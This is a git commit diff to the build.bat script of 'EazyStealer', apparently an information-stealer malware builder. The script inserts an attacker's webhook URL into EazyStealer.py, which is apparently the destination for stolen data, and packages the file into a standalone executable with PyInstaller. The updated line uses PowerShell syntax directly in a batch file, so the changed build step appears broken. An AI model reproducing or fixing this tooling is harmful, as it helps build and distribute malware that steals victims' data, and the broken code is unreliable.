dc5d66d5f33869db6706c1cf3eee551dcfc1e887
Sife <140217482+LETMETYPEAUSERNAME@users.noreply.github.com>
2024-11-27 13:04:35 +1000

    Update build.bat

--- build.bat
+++ build.bat
@@ -7,9 +7,9 @@ if "%webhook_url%"=="" (
     echo No webhook URL provided. Exiting...
     exit /b
 )
-powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py"
+(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8
 
-python -m PyInstaller --onefile EazyStealer.py
+python -m PyInstaller --onefile --hidden-import=encodings EazyStealer.py
 
 
 del EazyStealer.spec
